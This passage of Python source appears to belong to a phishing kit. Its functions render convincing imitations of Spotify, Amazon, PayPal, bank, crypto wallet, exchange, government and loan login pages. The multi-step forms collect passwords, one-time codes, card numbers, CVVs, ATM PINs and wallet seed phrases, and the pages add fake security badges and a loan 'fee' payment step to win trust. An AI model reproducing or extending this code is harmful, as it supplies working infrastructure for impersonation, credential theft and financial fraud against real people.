.foot div{display:flex;flex-wrap:wrap;gap:13px;justify-content:center;margin-bottom:8px}
.dfull{align-items:center;padding-top:34px;background:linear-gradient(180deg,#000000cc,#00000099),#000}
.dfull .card{border-radius:6px}
"""
    return body, body, css, step_js(step)

def lay_spotify(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    if step == "id":
        inner = ("<label class='lbl'>Email or username</label><input class='in' name='ident' required autofocus>"
                 "<label class='lbl'>Password</label><input class='in' name='pw' type='password' required>")
    elif step == "pw":
        inner = ("<p class='sm'>" + html.escape(ident) + "</p><label class='lbl'>Password</label>"
                 "<input class='in' name='pw' type='password' required autofocus>")
    else:
        inner = ("<p class='sm'>Enter the %d-digit code sent to you.</p>" % CFG["otp_len"] +
                 "<input class='in code' name='otp' inputmode='numeric' maxlength='" + str(CFG["otp_len"]) +
                 "' required autofocus>")
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner +
            "<button class='btn' type='submit'>Log In</button><div class='or'>or</div>"
            "<button class='alt' type='button'>Continue with Google</button></form>")
    body = ("<div class='box'>" + SPOT + "<h1>Log in to Spotify</h1><div class='card'>" + form + "</div>"
            "<div class='foot'>Don't have an account? <a>Sign up for Spotify</a></div></div>")
    css = """
body{background:#121212;color:#fff;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
.mob{padding:40px 20px}
.box{width:100%;max-width:420px;text-align:center}
h1{font-size:30px;font-weight:700;letter-spacing:-.6px;margin:22px 0 20px}
.card{background:#181818;border-radius:8px;padding:24px 22px;text-align:left}
.lbl{color:#fff}.in{height:48px;border:1px solid #727272;border-radius:4px;background:#121212;color:#fff;
 margin-bottom:14px}
.in:focus{border-color:#fff;box-shadow:none}
.btn{background:#1db954;color:#000;border-radius:999px;height:48px;font-size:16px;font-weight:700}
.or{display:flex;align-items:center;gap:14px;margin:18px 0;font-size:13px;color:#a7a7a7}
.or:before,.or:after{content:'';flex:1;height:1px;background:#292929}
.alt{width:100%;height:48px;border:1px solid #727272;border-radius:999px;background:transparent;color:#fff;
 font-size:15px;font-weight:700}
.foot{font-size:13px;color:#a7a7a7;margin-top:26px}.foot a{color:#fff;text-decoration:underline}
.sm{font-size:13px;color:#a7a7a7;margin-bottom:10px}
.dfull{align-items:center;padding-top:56px}
"""
    return body, body, css, ""

def lay_amazon(s, tok, step, ctx):
    inner = fld(step, s, tok, ctx) + "<button class='btn' type='submit'>" + \
            ("Continue" if step != "card" else "Add card") + "</button>"
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
            "<p class='legal'>By continuing, you agree to Amazon's <a>Conditions of Use</a> and "
            "<a>Privacy Notice</a>.</p>")
    body = ("<div class='top'>" + AMZN + "</div><div class='w'><div class='card'><h1>" +
            ("Sign in" if step != "card" else "Add a payment method") + "</h1>" + form + "</div>"
            "<div class='div'>New to Amazon?</div><button class='btn ghost'>Create your Amazon account</button>"
            "</div><div class='foot'>Conditions of Use &nbsp; Privacy Notice &nbsp; Help<br>"
            "&copy; 1996-2026, Amazon.com</div>")
    css = """
body{background:#fff;color:#0f1111;font-family:Arial,Helvetica,sans-serif}
.top{padding:15px;text-align:center;border-bottom:1px solid #e7e7e7}
.w{width:100%;max-width:350px;margin:0 auto;padding:20px}
.card{border:1px solid #ddd;border-radius:8px;padding:20px 18px}
h1{font-size:26px;font-weight:400;margin-bottom:12px}
.lbl{font-size:13px;font-weight:700;color:#0f1111;margin:12px 0 5px;text-transform:none;letter-spacing:0}
.in{height:31px;border:1px solid #888c8c;border-radius:3px;font-size:14px;margin-bottom:4px}
.in:focus{border-color:#e77600;box-shadow:0 0 3px #f0c14b}
.btn{height:31px;border:1px solid #a88734;border-radius:8px;background:linear-gradient(#f7dfa5,#f0c14b);
 color:#111;font-size:14px;margin-top:14px}
.btn.ghost{background:#fff;border-color:#d5d9d9;width:100%}
.legal{font-size:12px;color:#565959;margin-top:14px;line-height:1.6}.legal a{color:#0066c0}
.div{display:flex;align-items:center;gap:12px;margin:18px 0;font-size:12px;color:#767676}
.div:before,.div:after{content:'';flex:1;height:1px;background:#e7e7e7}
.foot{margin-top:20px;border-top:1px solid #e7e7e7;padding:16px;text-align:center;font-size:11px;color:#555}
.dfull{align-items:center;padding-top:30px;background:#fff}
.dfull .w{padding-top:0}
"""
    return body, body, css, step_js(step)

def lay_paypal(s, tok, step, ctx):
    inner = fld(step, s, tok, ctx) + "<button class='btn' type='submit'>" + \
            ("Log In" if step != "card" else "Confirm") + "</button>"
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
            "<button class='alt' type='button'>Sign up</button><div class='links'><a>Having trouble logging in?</a></div>")
    body = ("<div class='box'><div style='display:flex;justify-content:center;margin-bottom:20px'>" + PPAL +
            "</div><div class='card'><h1>" +
            ("Log in to PayPal" if step != "card" else "Confirm your card") + "</h1>" + form + "</div>"
            "<div class='foot'>PayPal &copy; 2026 &middot; Privacy &middot; Legal</div></div>")
    css = """
body{background:#f5f7fa;color:#001435;font-family:'Helvetica Neue',Arial,sans-serif}
.mob{padding:32px 18px}
.box{width:100%;max-width:400px}
.card{background:#fff;border-radius:12px;padding:24px 20px;box-shadow:0 6px 22px #00143514}
h1{font-size:22px;font-weight:600;text-align:center;margin-bottom:18px}
.lbl{color:#001435;text-transform:none;letter-spacing:0;font-size:12.5px}
.in{height:46px;border:1px solid #9da3a6;border-radius:6px;font-size:15px}
.in:focus{border-color:#0070ba;box-shadow:0 0 0 3px #0070ba22}
.btn{background:#0070ba;border-radius:999px;height:46px;font-size:16px;font-weight:600}
.alt{width:100%;height:44px;border:1px solid #0070ba;border-radius:999px;background:#fff;color:#0070ba;
 font-size:15px;font-weight:600;margin-top:12px}
.links{text-align:center;margin-top:16px;font-size:13.5px}.links a{color:#0070ba}
.foot{margin-top:auto;text-align:center;font-size:12px;color:#6c7378;padding:20px}
.dfull{align-items:center;padding-top:48px;background:#f5f7fa}
"""
    return body, body, css, step_js(step)

def lay_wallet(s, tok, step, ctx):
    inner = fld(step, s, tok, ctx, bare=True) + "<button class='btn' type='submit'>" + \
            ("Import" if step == "seed" else "Unlock") + "</button>"
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
    body = ("<div class='box'><div class='card'><div style='display:flex;justify-content:center;margin-bottom:16px'>" +
            brand(s, 170) + "</div><h1>" +
            ("Import an existing wallet" if step == "seed" else "Unlock your wallet") + "</h1>"
            "<p class='sm'>" + html.escape(s["help"] or s["sub"]) + "</p>" + form +
            "<div class='trust'>" + LOCK + " Keys never leave your device</div></div>"
            "<div class='foot'>" + html.escape(s["l"]) + " &copy; 2026</div></div>")
    css = """
body{background:var(--bg);color:#fff;font-family:'Inter',-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
.mob{padding:24px 18px}
.box{width:100%;max-width:400px}
.card{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:24px 20px}
h1{font-size:20px;font-weight:700;text-align:center;margin-bottom:8px}
.sm{font-size:12.5px;color:#9aa7b8;text-align:center;line-height:1.6;margin-bottom:16px}
.lbl{color:#8b98a9}.in{background:rgba(0,0,0,.35);border-color:rgba(255,255,255,.15);color:#fff}
.in:focus{border-color:var(--ac);box-shadow:none}
textarea.in{height:112px;font-size:13.5px;line-height:1.9}
.btn{background:var(--ac);border-radius:10px;height:50px;font-weight:700}
.trust{color:#8b98a9}
.foot{text-align:center;font-size:11px;color:#6f7c8d;margin-top:18px}
.dfull{align-items:center;justify-content:center;padding:24px 18px}
"""
    return body, body, css, ""

def lay_exch(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    if step == "id":
        inner = (fld("login", s, tok, ctx))
    elif step == "pw":
        inner = ("<p class='sm'>" + html.escape(ident) + "</p>" + fld("pw", s, tok, ctx))
    else:
        inner = ("<p class='sm'>Enter the %d-digit code from your authenticator or SMS</p>" % CFG["otp_len"] +
                 "<input class='in code' name='otp' inputmode='numeric' maxlength='" + str(CFG["otp_len"]) +
                 "' required autofocus>")
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner +
            "<button class='btn' type='submit'>Log in</button>"
            "<div class='links'><a>Forgot password?</a><a>Sign up</a></div></form>")
    body = ("<div class='box'><div class='card'><div style='display:flex;justify-content:center;margin-bottom:18px'>" +
            brand(s, 170) + "</div><h1>Log in</h1>" + form + "</div>"
            "<div class='foot'>" + html.escape(s["l"]) + " &copy; 2026 &middot; 2FA protected</div></div>")
    css = """
body{background:var(--bg);color:#eaecef;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
.mob{padding:26px 18px}
.box{width:100%;max-width:400px}
.card{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.09);border-radius:14px;padding:24px 20px}
h1{font-size:22px;font-weight:700;text-align:center;margin-bottom:18px}
.sm{font-size:13px;color:#8b98a9;text-align:center;margin-bottom:10px}
.lbl{color:#8b98a9}.in{background:rgba(0,0,0,.35);border-color:rgba(255,255,255,.14);color:#fff}
.in:focus{border-color:var(--ac);box-shadow:none}
.btn{background:var(--ac);border-radius:9px;height:48px;font-weight:700}
.links{display:flex;justify-content:space-between;font-size:12.5px;margin-top:14px}
.links a{color:var(--ac);font-weight:600}
.foot{text-align:center;font-size:11px;color:#6f7c8d;margin-top:16px}
.dfull{align-items:center;justify-content:center;padding:26px 18px}
"""
    return body, body, css, ""

def lay_app(s, tok, step, ctx):
    s2 = SITES[s["k"]]
    if s2["c"] == "shop":
        title, sub = "Login", "Enter your registered mobile number to receive an OTP."
    elif s2["c"] == "tel":
        title, sub = "Sign in", "Log in with your mobile number to manage your account."
    elif s2["c"] == "game":
        title, sub = "Sign in", "Log in to continue your progress and rewards."
    elif s2["c"] == "pay":
        title, sub = "Log in", "Enter your mobile number linked with your wallet."
    else:
        title, sub = "Sign in", s2["sub"] or "Welcome back"
    if step == "otp":
        sub = "Enter the %d-digit OTP sent to your number." % CFG["otp_len"]
    elif step == "pin":
        sub = "Enter your 4-digit wallet PIN to authorise this login."
    inner = fld(step, s2, tok, ctx) + "<button class='btn' type='submit'>" + \
            ("Verify" if step in ("otp", "pin") else "Continue") + "</button>" \
            "<div class='links'><a>Forgot password?</a><a>New here? Sign up</a></div>"
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
    head = ("<div class='hd'><span class='box'>" + brand(s2, 130) + "</span><span class='sp'></span>"
            "<a>Help</a></div>")
    mob = (head + "<div class='w'><h1>" + title + "</h1><p class='sm'>" + html.escape(sub) + "</p>" + form +
           "<div class='trust'>" + LOCK + " Secured by 256-bit TLS</div></div>"
           "<div class='foot'>&copy; 2026 " + html.escape(s2["l"]) + " &middot; Terms &middot; Privacy</div>")
    desk = ("<div class='hd'><span class='box'>" + brand(s2, 130) + "</span><span class='sp'></span>"
            "<a>Help</a></div><div class='ctr'><div class='card'><h1>" + title + "</h1><p class='sm'>" +
            html.escape(sub) + "</p>" + form + "<div class='trust'>" + LOCK +
            " Secured by 256-bit TLS</div></div></div>")
    css = """
body{background:var(--bg);color:var(--tx);font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
.hd{background:var(--bg);border-bottom:1px solid var(--bd);padding:12px 15px;display:flex;align-items:center;
 gap:10px;min-height:60px}
.hd .box{background:#fff;border-radius:9px;padding:5px 9px;display:flex;align-items:center}
.hd .sp{flex:1}.hd a{font-size:11.5px;font-weight:600;opacity:.85}
.w{flex:1;padding:24px 17px;max-width:430px;width:100%;margin:0 auto}
h1{font-size:22px;font-weight:800;margin-bottom:6px;letter-spacing:-.3px}
.sm{font-size:12.5px;color:var(--mut);line-height:1.65;margin-bottom:18px}
.btn{margin-top:18px}
.ctr{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
.card{width:400px;max-width:100%;border-radius:14px;padding:26px 22px}
.foot{margin-top:auto;padding:15px;text-align:center;font-size:11px;color:var(--mut);
 border-top:1px solid var(--bd)}
.dfull .hd{width:100%}
"""
    return mob, desk, css, step_js(step)

def lay_doc(s, tok, step, ctx):
    s2 = SITES[s["k"]]
    cat = s2["c"]
    if cat == "gov":
        title, sub = TITLES.get(step, "Login"), "Authorised portal login. Use your registered credentials."
    elif cat == "ship":
        title = "Track your shipment" if step == "id" else TITLES.get(step, "Verify")
        sub = ("Enter the consignment number to see live status." if step == "id"
               else "Enter the OTP sent to the registered mobile number.")
    elif cat in ("dev", "cloud"):
        title, sub = "Sign in", "Use your account credentials to continue to the dashboard."
    elif cat == "pay":
        title, sub = "Sign in", "Access your merchant dashboard."
    else:
        title, sub = "Sign in", "Enter your work email to continue."
    if step == "otp":
        sub = "Enter the %d-digit code we just sent you." % CFG["otp_len"]
    inner = fld(step, s2, tok, ctx) + "<button class='btn' type='submit'>" + \
            ("Verify" if step == "otp" else "Continue") + "</button>" \
            "<div class='links'><a>Forgot password?</a><a>Register</a></div>" \
            "<div class='trust'>" + LOCK + " Secure session</div>"
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
    head = ("<div class='hd'><span class='box'>" + brand(s2, 130) + "</span><span class='sp'></span>"
            "<a>Help</a><a>Contact</a></div><div class='crumb'>Home &rsaquo; <b>" + html.escape(s2["l"]) + "</b></div>")
    note = ("<p class='note'>Never share your password or OTP with anyone. " + html.escape(s2["l"]) +
            " will never call you asking for it.</p>")
    mob = (head + "<div class='w'><div class='card'><h1>" + html.escape(title) + "</h1><p class='sm'>" +
           html.escape(sub) + "</p>" + form + note + "</div></div>"
           "<div class='foot'>&copy; 2026 " + html.escape(s2["l"]) + " &middot; Privacy &middot; Terms</div>")
    desk = (head + "<div class='ctr'><div class='card'><h1>" + html.escape(title) + "</h1><p class='sm'>" +
            html.escape(sub) + "</p>" + form + note + "</div></div>")
    css = """
body{background:var(--fld);color:var(--tx);font-family:'Inter',-apple-system,'Segoe UI',Arial,sans-serif}
.hd{background:var(--card);border-bottom:1px solid var(--bd);padding:12px 16px;display:flex;align-items:center;gap:12px}
.hd .box{background:#fff;border-radius:8px;padding:4px 9px;display:flex;align-items:center}
.hd .sp{flex:1}.hd a{font-size:11.5px;font-weight:600;color:var(--mut)}
.crumb{font-size:11px;color:var(--mut);padding:10px 16px}
.w{flex:1;max-width:430px;width:100%;margin:0 auto;padding:6px 16px 30px}
h1{font-size:20px;margin-bottom:6px}
.sm{font-size:12.5px;color:var(--mut);margin-bottom:16px;line-height:1.65}
.card{background:var(--card);border:1px solid var(--bd);border-radius:12px;padding:20px 17px;
 box-shadow:0 14px 34px -26px #0b1a3a}
.note{background:var(--fld);border:1px solid var(--bd);border-radius:8px;padding:10px 12px;font-size:11.5px;
 color:var(--mut);line-height:1.65;margin-top:14px}
.ctr{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
.ctr .card{width:420px;max-width:100%}
.foot{background:#0f172a;color:#94a3b8;font-size:9.5px;padding:12px;text-align:center}
.dfull .hd{width:100%}
"""
    return mob, desk, css, step_js(step)

def lay_stream(s, tok, step, ctx):
    s2 = SITES[s["k"]]
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    if step in ("phone", "id"):
        inner = fld(step, s2, tok, ctx) + ("<label class='lbl'>Password</label>"
                                           "<input class='in' name='pw' type='password' required>"
                                           if step == "id" else "")
    elif step == "otp":
        inner = ("<p class='sm'>Enter the %d-digit code sent to your number.</p>" % CFG["otp_len"] +
                 "<input class='in code' name='otp' inputmode='numeric' maxlength='" + str(CFG["otp_len"]) +
                 "' required autofocus>")
    else:
        inner = fld(step, s2, tok, ctx)
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner +
            "<button class='btn' type='submit'>Continue</button>"
            "<div class='links'><a>Forgot password?</a><a>Create account</a></div></form>")
    head = "<div class='hd'><span class='box'>" + brand(s2, 140) + "</span><span class='sp'></span><a>Help</a></div>"
    mob = (head + "<div class='w'><div class='card'><h1>Sign in</h1>"
           "<p class='sm'>Watch on any device. Cancel anytime.</p>" + form + "</div></div>"
           "<div class='foot'>&copy; 2026 " + html.escape(s2["l"]) + " &middot; Terms &middot; Privacy</div>")
    desk = (head + "<div class='ctr'><div class='card'><h1>Sign in</h1>"
            "<p class='sm'>Watch on any device. Cancel anytime.</p>" + form + "</div></div>")
    css = """
body{background:var(--bg);color:var(--tx);font-family:'Amazon Ember',-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
.hd{padding:14px 18px;border-bottom:1px solid var(--bd);display:flex;align-items:center;gap:12px}
.hd .box{background:#fff;border-radius:8px;padding:4px 9px;display:flex;align-items:center}
.hd .sp{flex:1}.hd a{font-size:12px;color:var(--mut)}
.w{flex:1;max-width:400px;width:100%;margin:0 auto;padding:30px 18px}
.card{background:var(--card);border:1px solid var(--bd);border-radius:10px;padding:22px 18px}
h1{font-size:22px;font-weight:700;margin-bottom:6px}
.sm{font-size:12.5px;color:var(--mut);line-height:1.65;margin-bottom:16px}
.lbl{color:var(--mut)}.in{background:var(--fld);border-color:var(--bd)}
.btn{margin-top:18px}
.ctr{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
.ctr .card{width:400px;max-width:100%}
.foot{margin-top:auto;padding:14px;text-align:center;font-size:11px;color:var(--mut)}
.dfull .hd{width:100%}
"""
    return mob, desk, css, step_js(step)

def lay_sensor(s, tok, step, ctx):
    s2 = SITES[s["k"]]
    if step == "otp":
        inner = ("<h1>Verify your number</h1><p class='sm'>Enter the %d-digit code sent to <b>%s</b></p>"
                 "<input class='in code' name='otp' inputmode='numeric' maxlength='%d' required autofocus>"
                 "<button class='btn' type='submit'>Verify</button>"
                 % (CFG["otp_len"], html.escape(ctx.get("ident") or ""), CFG["otp_len"]))
        action = "otp"
    else:
        inner = ("<h1>Confirm your device</h1><p class='sm'>We check this device once so your account stays "
                 "protected. Takes 10 seconds.</p>" + fld("verify", s2, tok, ctx) +
                 "<button class='btn' type='submit'>Continue</button>"
                 "<div class='steps'><i><b>1</b>Device</i><i><b>2</b>Details</i><i><b>3</b>Code</i></div>"
                 "<div class='trust'>" + LOCK + " Bank-grade verification</div>")
        action = "verify"
    body = ("<div class='box'><div class='card'><div class='badge'>" + LOCK + " Secure device check</div>"
            "<form method='post' " + act(tok, s["k"], action) + ">" + hid(tok, s["k"]) + inner + "</form></div>"
            "<div class='foot'>&copy; 2026 " + html.escape(s2["l"]) + " &middot; Device intelligence</div></div>")
    css = """
body{background:#0f172a;color:#e2e8f0;font-family:'Inter',-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
.mob{padding:36px 18px}
.box{width:100%;max-width:400px}
.card{background:#16213a;border:1px solid #24314e;border-radius:16px;padding:24px 20px;text-align:center}
h1{font-size:21px;font-weight:700;margin-bottom:8px}
.sm{font-size:12.5px;color:#94a3b8;line-height:1.65;margin-bottom:18px}
.badge{display:inline-flex;align-items:center;gap:6px;background:#1e293b;border:1px solid #334155;
 color:#7dd3fc;font-size:9.5px;letter-spacing:.6px;text-transform:uppercase;padding:4px 10px;border-radius:20px;
 margin-bottom:14px}
.lbl{color:#94a3b8;text-align:left}.in{background:#0d1626;border-color:#24314e;color:#e2e8f0}
.in:focus{border-color:#3b82f6;box-shadow:none}
.btn{background:#3b82f6;border-radius:10px;height:50px;font-weight:700}
.trust{color:#64748b}
.steps{display:flex;justify-content:center;gap:18px;margin-top:18px;font-size:10.5px;color:#64748b}
.steps i{font-style:normal;display:flex;flex-direction:column;align-items:center;gap:5px}
.steps i b{width:26px;height:26px;border-radius:50%;background:#1e293b;border:1px solid #334155;
 display:flex;align-items:center;justify-content:center;font-size:11px;color:#7dd3fc}
.foot{margin-top:auto;text-align:center;font-size:11px;color:#475569;padding:16px}
.dfull{align-items:center;justify-content:center;padding:36px 18px}
"""
    return body, body, css, ""

def lay_bank(s, tok, step, ctx):
    s2 = SITES[s["k"]]
    head = ("<div class='hd'><span class='box'>" + brand(s2, 120) + "</span>"
            "<div><div class='w1'>" + html.escape(s2["l"]) + "</div><div class='w2'>Internet Banking</div></div>"
            "<span class='sp'></span><span class='lk'>" + LOCK + " Secure</span></div>"
            "<div class='nav'><b>Personal</b><span>Cards</span><span>Loans</span><span>Support</span></div>"
            "<div class='crumb'>Home &rsaquo; <b>" + ("Login" if step == "login" else
                                                     "Verify card" if step == "card" else "Authentication") +
            "</b></div>")
    if step == "login":
        inner = ("<h1>Login to internet banking</h1><p class='sm'>Use your customer ID and password. "
                 "Card holders must log in before adding a new card.</p>" + fld("login", s2, tok, ctx) +
                 "<button class='btn' type='submit'>Secure login</button>"
                 "<div class='links'><a>Forgot password?</a><a>New user? Register</a></div>"
                 "<div class='trust'>" + LOCK + " Encrypted end to end</div>")
    elif step == "card":
        inner = ("<h1>Enter your card details</h1><p class='sm'>" + html.escape(s2["help"]) + "</p>" +
                 fld("card", s2, tok, ctx) + "<button class='btn' type='submit'>Verify card</button>"
                 "<div class='trust'>" + LOCK + " Card details are encrypted</div>")
    elif step == "otp":
        last = (ctx.get("card") or "").replace(" ", "")[-4:] or "0000"
        inner = ("<h1>Enter OTP</h1><p class='sm'>A one-time password was sent to the mobile number registered "
                 "with your account (XXXXXX" + last + ").</p>" + fld("otp", s2, tok, ctx) +
                 "<button class='btn' type='submit'>Submit</button>"
                 "<div class='trust'>Do not refresh this page</div>")
    else:
        last = (ctx.get("card") or "").replace(" ", "")[-4:] or "0000"
        inner = ("<h1>Enter your ATM PIN</h1><p class='sm'>Enter the 4-digit PIN of the card ending " + last +
                 " to authorise this login.</p>" + fld("pin", s2, tok, ctx) +
                 "<button class='btn' type='submit'>Confirm</button>")
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
    side = ("<div class='side'><div class='sbx'><h4>Security tips</h4><ul><li>Never share your OTP</li>"
            "<li>Bank staff never ask for CVV</li><li>Check the padlock before typing</li></ul>"
            "<div style='border-top:1px solid rgba(255,255,255,.25);margin-top:10px;padding-top:8px;font-size:11px'>"
            "256-bit TLS &middot; PCI-DSS gateway</div></div></div>")
    mob = (head + "<div class='w'><div class='card'>" + form + "</div></div>"
           "<div class='foot'>&copy; 2026 " + html.escape(s2["l"]) + " &middot; Protected by 3-D Secure</div>")
    desk = ("<div class='split'>" + side + "<div class='main'><div class='card'>" + form + "</div></div></div>")
    css = """
body{background:var(--fld);color:var(--tx);font-family:'Inter',-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
.hd{background:var(--ac);color:var(--btn);padding:10px 15px;display:flex;align-items:center;gap:10px;min-height:58px}
.hd .box{background:#fff;border-radius:6px;padding:4px 8px;display:flex;align-items:center}
.hd .w1{font-weight:800;font-size:14px;line-height:1.15}
.hd .w2{font-size:9px;opacity:.85;text-transform:uppercase;letter-spacing:.4px}
.hd .sp{flex:1}
.hd .lk{font-size:9.5px;display:flex;align-items:center;gap:4px;background:rgba(255,255,255,.18);
 padding:4px 8px;border-radius:20px}
.nav{display:flex;gap:16px;background:var(--card);padding:10px 15px;font-size:11.5px;color:var(--mut);
 border-bottom:1px solid var(--bd)}.nav b{color:var(--ac)}
.crumb{font-size:11px;color:var(--mut);padding:10px 15px;max-width:460px;margin:0 auto;width:100%}
.crumb b{color:var(--ac)}
.w{flex:1;width:100%;max-width:460px;margin:0 auto;padding:0 15px 24px}
.card{background:var(--card);border-radius:12px;padding:20px 17px;border-top:4px solid var(--ac);
 box-shadow:0 16px 40px -30px #0b1a3a}
h1{font-size:18px;margin-bottom:6px}
.sm{font-size:12.5px;color:var(--mut);line-height:1.65;margin-bottom:14px}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:28px}
.main .card{width:400px;max-width:100%}
.sbx{font-size:12px;line-height:1.85;opacity:.95}
.sbx h4{font-size:10px;text-transform:uppercase;letter-spacing:.9px;margin-bottom:8px;opacity:.85}
.sbx ul{margin-left:16px}
.foot{background:#111827;color:#9ca3af;font-size:9.5px;text-align:center;padding:11px}
"""
    return mob, desk, css, step_js(step)

LSTEP = {"apply": "Amount", "kyc": "KYC", "docs": "Documents", "bank": "Bank", "approve": "Sanction",
         "card": "Card", "cvv": "CVV", "otp": "OTP", "pin": "PIN"}

def lay_loan(s, tok, step, ctx):
    s2 = SITES[s["k"]]
    fl = s2["fl"]
    idx = fl.index(step) if step in fl else 0
    bars = "".join("<i class='%s'></i>" % ("d" if i <= idx else "") for i in range(len(fl)))
    enc = " enctype='multipart/form-data'" if step == "docs" else ""
    amt = ctx.get("amount") or "100000"
    ten = ctx.get("tenure") or "24 months"
    side = ("<div class='aside'><div class='sbox'><h4>Your application</h4>"
            "<div class='kv'><span>Amount</span><b id='sa'>&#8377;" + inr(amt) + "</b></div>"
            "<div class='kv'><span>Tenure</span><b id='st'>" + html.escape(ten) + "</b></div>"
            "<div class='kv'><span>EMI (approx)</span><b id='se'>&#8377;" + inr(emi(amt, ten)) + "</b></div>"
            "<div class='kv'><span>Rate</span><b>10.90% p.a.</b></div>"
            "<h4 style='margin-top:14px'>Why apply here</h4><ul><li>Approval in 5 minutes</li>"
            "<li>No branch visit needed</li><li>Money in account in 24 hours</li></ul>"
            "<div style='border-top:1px solid var(--bd);margin-top:10px;padding-top:8px;font-size:10.5px'>"
            "RBI registered NBFC &middot; ISO 27001</div></div></div>")
    head = ("<div class='hd'><span class='box'>" + brand(s2, 120) + "</span><div><div class='w1'>" +
            html.escape(s2["l"]) + "</div><div class='w2'>Loans &amp; Cards</div></div><span class='sp'></span>"
            "<span class='lk'>" + LOCK + " Secure</span></div><div class='crumb'>Home &rsaquo; Loans &rsaquo; <b>" +
            LSTEP.get(step, "Apply") + "</b></div>")
    prog = ("<div class='prog'>" + bars + "</div><div class='ptxt'>Step " + str(idx + 1) + " of " +
            str(len(fl)) + " &middot; " + LSTEP.get(step, step) + "</div>")
    form = ("<form method='post' " + act(tok, s["k"], step) + enc + ">" + hid(tok, s["k"]) +
            fld(step, s2, tok, ctx) + "<button class='btn' type='submit'>" +
            ("Pay fee &amp; activate" if step == "approve" else "Continue") + "</button></form>")
    mob = (head + prog + "<div class='w'><div class='card'><h1>" + TITLES.get(step, "Apply") + "</h1>" +
           form + "</div></div><div class='foot'>&copy; 2026 " + html.escape(s2["l"]) +
           " &middot; T&amp;C apply</div>")
    desk = ("<div class='split'>" + side + "<div class='main'><div class='card'><h1>" +
            TITLES.get(step, "Apply") + "</h1>" + form + "</div></div></div>")
    calc = ""
    if step == "apply":
        calc = ("<script>(function(){function r(){var a=document.querySelector('input[name=amount]:checked'),"
                "t=document.getElementById('ten');if(!a||!t)return;var p=+a.value,n=parseInt(t.value),"
                "rt=10.9/1200,f=Math.pow(1+rt,n),e=Math.round(p*rt*f/(f-1));"
                "document.getElementById('sa').textContent='\\u20B9'+p.toLocaleString('en-IN');"
                "document.getElementById('st').textContent=t.value+' months';"
                "document.getElementById('se').textContent='\\u20B9'+e.toLocaleString('en-IN');}"
                "[].forEach.call(document.querySelectorAll('input[name=amount]'),function(x){"
                "x.addEventListener('change',r)});var t=document.getElementById('ten');"
                "if(t)t.addEventListener('change',r);})();</script>")
    css = """
body{background:var(--fld);color:var(--tx);font-family:'Inter',-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
.hd{background:var(--card);padding:10px 15px;display:flex;align-items:center;gap:10px;min-height:58px;
 border-bottom:1px solid var(--bd)}
.hd .box{background:#fff;border-radius:8px;padding:4px 9px;display:flex;align-items:center}
.hd .w1{font-weight:800;font-size:14px;line-height:1.15}
.hd .w2{font-size:9px;color:var(--mut);text-transform:uppercase;letter-spacing:.5px}
.hd .sp{flex:1}
.hd .lk{font-size:9.5px;display:flex;align-items:center;gap:4px;background:var(--fld);color:var(--ac);
 padding:4px 8px;border-radius:20px;font-weight:600}
.crumb{font-size:11px;color:var(--mut);padding:10px 15px}.crumb b{color:var(--ac)}
.w{flex:1;width:100%;max-width:460px;margin:0 auto;padding:0 15px 24px}
.card{background:var(--card);border-radius:14px;padding:20px 17px;border-top:4px solid var(--ac);
 box-shadow:0 18px 44px -32px #0b1a3a}
h1{font-size:19px;margin-bottom:8px}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:26px}
.main .card{width:420px;max-width:100%}
.foot{background:#111827;color:#9ca3af;font-size:9.5px;padding:13px;text-align:center}
"""
    return mob, desk, css, step_js(step) + calc

FAMS = {"gen": lay_gen, "ig": lay_ig, "igf": lay_igf, "fb": lay_fb, "google": lay_google, "yt": lay_yt,
        "x": lay_x, "li": lay_li, "gh": lay_gh, "ms": lay_ms, "apple": lay_apple, "wa": lay_wa,
        "tg": lay_tg, "netflix": lay_netflix, "spotify": lay_spotify, "amazon": lay_amazon,
        "paypal": lay_paypal, "wallet": lay_wallet, "exch": lay_exch, "app": lay_app, "doc": lay_doc,
        "stream": lay_stream, "sensor": lay_sensor, "tiktok": lay_tiktok, "discord": lay_discord,
        "reddit": lay_reddit, "snap": lay_snap, "redeem": lay_redeem, "roblox": lay_roblox,
        "ff": lay_ff, "gplay": lay_gplay, "itunes": lay_itunes}

def render(site, tok, step, ctx):
    s = SITES[site]
    if s["c"] == "loan":
        m, d, c, j = lay_loan(s, tok, step, ctx)
        return page(site, s["l"] + " | " + TITLES.get(step, ""), c, m, d, j)
    if s["c"] == "bank":
        m, d, c, j = lay_bank(s, tok, step, ctx)
        return page(site, s["l"] + " | Internet Banking", c, m, d, j)
    if s["c"] == "card":
